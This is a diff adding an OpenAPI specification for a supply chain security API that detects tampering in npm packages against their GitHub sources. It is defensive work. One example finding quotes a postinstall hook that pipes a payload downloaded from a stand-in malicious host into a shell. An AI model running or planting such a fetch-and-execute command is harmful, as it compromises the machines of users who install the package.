@@ -1,0 +1,657 @@
+openapi: 3.0.3
+info:
+  title: WANNABE Supply Chain Verification API
+  description: >
+    High-performance REST API for automated software supply chain security and source-to-package verification.
+    Compares published npm package tarballs against declared GitHub release tags to detect malicious discrepancies,
+    injected lifecycle scripts, AST anomalies, and obfuscated payloads.
+  version: 0.1.0
+  contact:
+    name: Team Spice Girls
+    url: https://github.com/Jalalabadi32-bit/WannaBe
+  license:
+    name: MIT
+    url: https://opensource.org/licenses/MIT
+
+servers:
+  - url: http://localhost:3000
+    description: Local Development Server
+  - url: https://api.wannabe.security
+    description: Production Gateway
+
+tags:
+  - name: System
+    description: Operational health, readiness, and Prometheus telemetry endpoints
+  - name: Scans
+    description: Verification scan execution, polling, and report retrieval
+  - name: Auth
+    description: Authentication and identity session management
+
+paths:
+  /healthz:
+    get:
+      tags:
+        - System
+      summary: Liveness probe
+      description: Returns HTTP 200 if the Fastify process is running and responsive.
+      operationId: getHealth
+      responses:
+        '200':
+          description: Service is healthy
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/HealthStatus'
+
+  /readyz:
+    get:
+      tags:
+        - System
+      summary: Readiness probe
+      description: Checks backend readiness including storage sandboxes and AI explainer adapter connectivity.
+      operationId: getReadiness
+      responses:
+        '200':
+          description: Service is ready to accept scan traffic
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ReadinessStatus'
+        '503':
+          description: Service dependencies are unavailable
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+
+  /metrics:
+    get:
+      tags:
+        - System
+      summary: Prometheus metrics endpoint
+      description: Exposes Prometheus-formatted operational and runtime metrics.
+      operationId: getMetrics
+      responses:
+        '200':
+          description: Prometheus metrics formatted text
+          content:
+            text/plain:
+              schema:
+                type: string
+                example: |
+                  # HELP wannabe_scans_total Total number of scans requested
+                  # TYPE wannabe_scans_total counter
+                  wannabe_scans_total{status="completed"} 42
+
+  /api/v1/scans:
+    post:
+      tags:
+        - Scans
+      summary: Initiate source-to-package verification
+      description: Schedules a background verification scan comparing a published npm package with its GitHub source tag.
+      operationId: createScan
+      security:
+        - BearerAuth: []
+        - ApiKeyAuth: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/CreateScanRequest'
+      responses:
+        '202':
+          description: Verification scan accepted and queued
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/CreateScanResponse'
+        '400':
+          description: Invalid request parameters or unresolvable targets
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+        '401':
+          description: Authentication required or invalid token
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+        '403':
+          description: Insufficient RBAC permissions (Requires analyst or admin)
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+        '429':
+          description: Rate limit exceeded (Token-bucket threshold reached)
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+        '500':
+          description: Internal processing failure
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+
+    get:
+      tags:
+        - Scans
+      summary: List recent scans
+      description: Retrieves a paginated list of recent package scans.
+      operationId: listScans
+      security:
+        - BearerAuth: []
+        - ApiKeyAuth: []
+      parameters:
+        - name: limit
+          in: query
+          description: Maximum number of scans to return
+          required: false
+          schema:
+            type: integer
+            default: 20
+            minimum: 1
+            maximum: 100
+        - name: offset
+          in: query
+          description: Pagination offset
+          required: false
+          schema:
+            type: integer
+            default: 0
+            minimum: 0
+      responses:
+        '200':
+          description: Paginated scan summary list
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ScanListResponse'
+        '401':
+          description: Authentication required
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+
+  /api/v1/scans/{id}:
+    get:
+      tags:
+        - Scans
+      summary: Get scan status and progress
+      description: Returns the real-time processing state of an ongoing or completed verification scan.
+      operationId: getScanStatus
+      security:
+        - BearerAuth: []
+        - ApiKeyAuth: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          description: Unique scan UUID
+          schema:
+            type: string
+            format: uuid
+      responses:
+        '200':
+          description: Current scan status
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ScanStatusResponse'
+        '401':
+          description: Authentication required
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+        '404':
+          description: Scan ID not found
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+
+  /api/v1/scans/{id}/report:
+    get:
+      tags:
+        - Scans
+      summary: Retrieve full verification report
+      description: Returns the complete, evidence-backed security audit report, including file diffs, AST flags, and AI explanation.
+      operationId: getScanReport
+      security:
+        - BearerAuth: []
+        - ApiKeyAuth: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          description: Unique scan UUID
+          schema:
+            type: string
+            format: uuid
+        - name: format
+          in: query
+          required: false
+          description: Response format serialization
+          schema:
+            type: string
+            enum: [json, sarif]
+            default: json
+      responses:
+        '200':
+          description: Complete verification audit report
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ScanReport'
+        '401':
+          description: Authentication required
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+        '404':
+          description: Scan ID not found
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+        '409':
+          description: Scan still in progress (report not yet available)
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+
+components:
+  securitySchemes:
+    BearerAuth:
+      type: http
+      scheme: bearer
+      bearerFormat: JWT
+      description: RS256/HS256 signed JSON Web Token
+    ApiKeyAuth:
+      type: apiKey
+      in: header
+      name: X-API-Key
+      description: Pre-shared API key for automated CI/CD pipelines
+
+  schemas:
+    HealthStatus:
+      type: object
+      required:
+        - status
+        - timestamp
+        - uptime
+      properties:
+        status:
+          type: string
+          example: healthy
+        timestamp:
+          type: string
+          format: date-time
+          example: '2026-11-01T00:00:00.000Z'
+        uptime:
+          type: number
+          example: 1245.82
+
+    ReadinessStatus:
+      type: object
+      required:
+        - status
+        - checks
+      properties:
+        status:
+          type: string
+          example: ready
+        checks:
+          type: object
+          properties:
+            sandboxStorage:
+              type: string
+              example: ok
+            aiExplainer:
+              type: string
+              example: available
+            cacheStore:
+              type: string
+              example: ok
+
+    CreateScanRequest:
+      type: object
+      required:
+        - packageName
+        - version
+      properties:
+        packageName:
+          type: string
+          example: 'chalk'
+        version:
+          type: string
+          example: '5.3.0'
+        repoUrl:
+          type: string
+          format: uri
+          example: 'https://github.com/chalk/chalk'
+        gitTag:
+          type: string
+          example: 'v5.3.0'
+
+    CreateScanResponse:
+      type: object
+      required:
+        - scanId
+        - status
+        - message
+      properties:
+        scanId:
+          type: string
+          format: uuid
+          example: '3fa85f64-5717-4562-b3fc-2c963f66afa6'
+        status:
+          $ref: '#/components/schemas/ScanStatus'
+        message:
+          type: string
+          example: 'Verification scan queued successfully.'
+
+    ScanStatus:
+      type: string
+      enum:
+        - queued
+        - fetching
+        - extracting
+        - analyzing
+        - evaluating_ai
+        - completed
+        - failed
+      example: analyzing
+
+    ScanStatusResponse:
+      type: object
+      required:
+        - scanId
+        - status
+        - startedAt
+      properties:
+        scanId:
+          type: string
+          format: uuid
+        status:
+          $ref: '#/components/schemas/ScanStatus'
+        startedAt:
+          type: string
+          format: date-time
+        completedAt:
+          type: string
+          format: date-time
+        progressPercentage:
+          type: integer
+          minimum: 0
+          maximum: 100
+          example: 65
+
+    ScanListResponse:
+      type: object
+      required:
+        - total
+        - limit
+        - offset
+        - items
+      properties:
+        total:
+          type: integer
+          example: 120
+        limit:
+          type: integer
+          example: 20
+        offset:
+          type: integer
+          example: 0
+        items:
+          type: array
+          items:
+            $ref: '#/components/schemas/ScanReport'
+
+    SecuritySeverity:
+      type: string
+      enum: [info, low, medium, high, critical]
+      example: critical
+
+    SecurityFlagCategory:
+      type: string
+      enum:
+        - lifecycle_hook
+        - eval_execution
+        - entropy_obfuscation
+        - network_exfil
+        - filesystem_access
+        - manifest_drift
+        - unmapped_binary
+      example: lifecycle_hook
+
+    SecurityFlag:
+      type: object
+      required:
+        - ruleId
+        - severity
+        - category
+        - message
+        - filePath
+      properties:
+        ruleId:
+          type: string
+          example: 'WANNABE-R001'
+        severity:
+          $ref: '#/components/schemas/SecuritySeverity'
+        category:
+          $ref: '#/components/schemas/SecurityFlagCategory'
+        message:
+          type: string
+          example: 'Uncommitted postinstall hook executing external shell command.'
+        filePath:
+          type: string
+          example: 'package.json'
+        lineRange:
+          type: array
+          items:
+            type: integer
+          minItems: 2
+          maxItems: 2
+          example: [14, 16]
+        snippet:
+          type: string
+          example: '"postinstall": "curl -s http://malicious.cdn/payload | sh"'
+
+    FileDiffStatus:
+      type: string
+      enum:
+        - identical
+        - modified
+        - added_in_package
+        - missing_in_package
+        - expected_build_artifact
+      example: added_in_package
+
+    FileDiff:
+      type: object
+      required:
+        - path
+        - status
+        - sizeDiffBytes
+        - flags
+      properties:
+        path:
+          type: string
+          example: 'dist/telemetry.min.js'
+        status:
+          $ref: '#/components/schemas/FileDiffStatus'
+        sourceSha256:
+          type: string
+          example: null
+        packageSha256:
+          type: string
+          example: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
+        sizeDiffBytes:
+          type: integer
+          example: 4096
+        entropy:
+          type: number
+          example: 5.84
+        flags:
+          type: array
+          items:
+            $ref: '#/components/schemas/SecurityFlag'
+
+    ScanSummary:
+      type: object
+      required:
+        - totalFilesSource
+        - totalFilesPackage
+        - matchedFiles
+        - modifiedFiles
+        - addedFiles
+        - missingFiles
+        - expectedArtifacts
+        - criticalFlags
+        - highFlags
+        - mediumFlags
+        - lowFlags
+        - infoFlags
+      properties:
+        totalFilesSource:
+          type: integer
+          example: 24
+        totalFilesPackage:
+          type: integer
+          example: 26
+        matchedFiles:
+          type: integer
+          example: 20
+        modifiedFiles:
+          type: integer
+          example: 2
+        addedFiles:
+          type: integer
+          example: 2
+        missingFiles:
+          type: integer
+          example: 0
+        expectedArtifacts:
+          type: integer
+          example: 2
+        criticalFlags:
+          type: integer
+          example: 1
+        highFlags:
+          type: integer
+          example: 0
+        mediumFlags:
+          type: integer
+          example: 1
+        lowFlags:
+          type: integer
+          example: 0
+        infoFlags:
+          type: integer
+          example: 3
+
+    RiskLevel:
+      type: string
+      enum: [clean, suspicious, critical]
+      example: critical
+
+    AIVerdict:
+      type: object
+      required:
+        - riskScore
+        - riskLevel
+        - summary
+        - technicalAnalysis
+        - recommendations
+        - modelAttribution
+      properties:
+        riskScore:
+          type: number
+          minimum: 0
+          maximum: 100
+          example: 92
+        riskLevel:
+          $ref: '#/components/schemas/RiskLevel'
+        summary:
+          type: string
+          example: 'Package exhibits critical supply chain tampering with uncommitted postinstall shell execution.'
+        technicalAnalysis:
+          type: string
+          example: 'The package contains an uncommitted postinstall script that downloads code from an untrusted endpoint.'
+        recommendations:
+          type: array
+          items:
+            type: string
+          example:
+            - 'Do not install this package version.'
+            - 'Report package tampering to npm security team.'
+        modelAttribution:
+          type: string
+          example: 'Google Gemma 4 E4B via Ollama'
+
+    ScanReport:
+      type: object
+      required:
+        - id
+        - target
+        - status
+        - startedAt
+        - fileDiffs
+        - flags
+      properties:
+        id:
+          type: string
+          format: uuid
+        target:
+          $ref: '#/components/schemas/CreateScanRequest'
+        status:
+          $ref: '#/components/schemas/ScanStatus'
+        startedAt:
+          type: string
+          format: date-time
+        completedAt:
+          type: string
+          format: date-time
+        summary:
+          $ref: '#/components/schemas/ScanSummary'
+        fileDiffs:
+          type: array
+          items:
+            $ref: '#/components/schemas/FileDiff'
+        flags:
+          type: array
+          items:
+            $ref: '#/components/schemas/SecurityFlag'
+        aiVerdict:
+          $ref: '#/components/schemas/AIVerdict'
+        error:
+          type: string
+
+    ErrorResponse:
+      type: object
+      required:
+        - statusCode
+        - error
+        - message
+      properties:
+        statusCode:
+          type: integer
+          example: 400
+        error:
+          type: string
+          example: 'Bad Request'
+        message:
+          type: string
+          example: 'The target package version 99.9.9 does not exist on the npm registry.'
+        details:
+          type: object
